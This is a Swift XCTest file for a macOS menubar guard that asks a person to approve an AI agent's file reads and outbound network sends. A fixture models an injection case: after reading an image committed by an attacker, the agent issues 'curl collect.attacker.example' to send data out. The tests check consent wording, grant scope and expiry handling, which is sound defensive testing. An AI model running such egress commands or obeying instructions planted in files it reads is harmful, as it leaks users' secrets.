import XCTest
import SwiftUI
@testable import SecureAgentMenubar

final class GuardReviewTests: XCTestCase {
    let pending = GuardPending(id: "request", agent: "claude", tool: "Read", path: "/workspace/app/.env", ruleID: "env-files", ts: "", scopeText: nil, advisor: nil, availableScopes: [.init(kind: "once", expiry: nil), .init(kind: "exact", expiry: "24h")], readerExe: "/bin/claude", workspace: "/workspace/app", sessionID: "session")
    let sendAfterImage = GuardPending(id: "send", agent: "claude", tool: "Bash", path: "curl collect.attacker.example", ruleID: "untrusted-egress", ts: "", scopeText: nil, advisor: nil, availableScopes: [.init(kind: "once", expiry: nil), .init(kind: "session", expiry: nil)], readerExe: "/bin/claude", workspace: "/workspace/app", sessionID: "session", detail: "This session read untrusted content: image /workspace/app/docs/build-spec.png, committed by Mallory <mallory@attacker.example> in app@c405510 on 2026-10-28 (docs: add build spec diagram). It now sends data out: curl collect.attacker.example.")

    func testGrantTermsNameTheSelectedLifetimeAndLimits() throws {
        let text = try XCTUnwrap(pending.grantTerms(scope: "exact", expiry: "24h"))
        for fact in ["this file and tool", "24 hours", "signatures are not verified", "File approval does not authorize network access."] { XCTAssertTrue(text.contains(fact), fact) }
        XCTAssertNil(pending.grantTerms(scope: "exact", expiry: "7d"))
        XCTAssertFalse(pending.requestFacts.contains("Why:"))
    }

    @MainActor
    func testSendAfterUntrustedInputNamesWhatTheSessionRead() throws {
        XCTAssertTrue(sendAfterImage.requestFacts.hasPrefix("Why: This session read untrusted content: image /workspace/app/docs/build-spec.png, committed by Mallory <mallory@attacker.example>"))
        XCTAssertTrue(sendAfterImage.requestFacts.contains("Resource: curl collect.attacker.example"))
        XCTAssertEqual(AppState.guardPromptHeadline(sendAfterImage), "Claude wants to send data out after reading untrusted content")
        XCTAssertEqual(AppState.guardPromptHeadline(pending), "Claude requests Read access")
        let text = try XCTUnwrap(sendAfterImage.grantTerms(scope: "session", expiry: nil))
        XCTAssertTrue(text.hasPrefix("Allows these sends from this tool until this session ends."), text)
        XCTAssertTrue(text.contains("Other sends still ask."))
        XCTAssertFalse(text.contains("File approval"))
    }

    @MainActor
    func testRequestRendersAtPopoverWidth() async throws {
        try await renderRequest(pending, to: "access-request.png")
    }

    @MainActor
    func testSendAfterUntrustedInputRendersAtPopoverWidth() async throws {
        try await renderRequest(sendAfterImage, to: "untrusted-egress-request.png")
    }

    @MainActor
    private func renderRequest(_ request: GuardPending, to name: String) async throws {
        _ = NSApplication.shared
        let policy = NSApp.activationPolicy()
        XCTAssertTrue(NSApp.setActivationPolicy(.regular))
        NSApp.finishLaunching()
        defer { NSApp.setActivationPolicy(policy) }
        let state = AppState.previewAttention()
        state.seedPostureForTesting(nil, pendingGuard: request)
        let controller = NSHostingController(rootView: ConsoleView(state: state, scrollable: false))
        let window = NSWindow(contentViewController: controller)
        window.isReleasedWhenClosed = false
        window.appearance = NSAppearance(named: .darkAqua)
        window.setContentSize(NSSize(width: 340, height: controller.view.fittingSize.height))
        window.makeKeyAndOrderFront(nil)
        try await Task.sleep(for: .milliseconds(200))
        controller.view.layoutSubtreeIfNeeded()
        XCTAssertEqual(controller.view.bounds.width, 340)
        let bitmap = try XCTUnwrap(controller.view.bitmapImageRepForCachingDisplay(in: controller.view.bounds))
        controller.view.cacheDisplay(in: controller.view.bounds, to: bitmap)
        let dir = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent().appendingPathComponent(".build/guard-qa")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        try XCTUnwrap(bitmap.representation(using: .png, properties: [:])).write(to: dir.appendingPathComponent(name))
        window.orderOut(nil); window.close()
    }

    @MainActor
    func testInspectionDoesNotResolveAndUsesExactSession() {
        let client = StubDaemonClient()
        let state = AppState(client: client)
        state.seedPostureForTesting(nil, pendingGuard: pending)
        var destinations: [ConsoleDestination] = []
        state.inspectPendingGuard(id: "other", open: { destinations.append($0) })
        state.inspectPendingGuard(id: "request", open: { destinations.append($0) })
        XCTAssertEqual(destinations, [.session("session")])
        XCTAssertEqual(state.pendingGuard?.id, "request")
        XCTAssertTrue(client.guardResolveCalls.isEmpty)
    }

    @MainActor
    func testUnansweredPromptAndExpiredRequestDoNotWrite() async {
        let client = StubDaemonClient()
        client.pending = [pending]
        let state = AppState(client: client)
        state.seedPostureForTesting(nil, pendingGuard: pending)
        state.runGuardPrompt = { _ in .withdrawn }
        await state.resolvePendingGuard(id: "request", verdict: "allow", scope: "exact", expiry: "24h")
        XCTAssertTrue(client.guardResolveCalls.isEmpty)
        let expired = AppState(client: client)
        expired.seedPostureForTesting(nil, pendingGuard: pending)
        expired.runGuardPrompt = { $0.selected.map { .allow($0) } ?? .deny }
        client.pending = []
        await expired.resolvePendingGuard(id: "request", verdict: "allow", scope: "exact", expiry: "24h")
        XCTAssertTrue(client.guardResolveCalls.isEmpty)
        XCTAssertEqual(expired.guardRequestNotice, "Request no longer pending. No answer was submitted.")
    }

    @MainActor
    func testLiveRequestSubmitsExactConsentAndReadFailureDoesNotClaimSubmission() async {
        let client = StubDaemonClient()
        client.pending = [pending]
        let state = AppState(client: client)
        state.seedPostureForTesting(nil, pendingGuard: pending)
        state.runGuardPrompt = { $0.selected.map { .allow($0) } ?? .deny }
        await state.resolvePendingGuard(id: "request", verdict: "allow", scope: "exact", expiry: "24h")
        XCTAssertEqual(client.guardResolveCalls.count, 1)
        XCTAssertEqual(client.guardResolveCalls.first?.id, "request")
        XCTAssertEqual(client.guardResolveCalls.first?.expiry, "24h")
        client.guardError = NSError(domain: "fixture", code: 1)
        state.seedPostureForTesting(nil, pendingGuard: pending)
        await state.resolvePendingGuard(id: "request", verdict: "deny", scope: "once")
        XCTAssertEqual(client.guardResolveCalls.count, 1)
        XCTAssertNil(state.guardResult)
        XCTAssertEqual(state.guardRequestNotice, "Pending requests unavailable. No answer was submitted. Refresh before trying again.")
    }
}
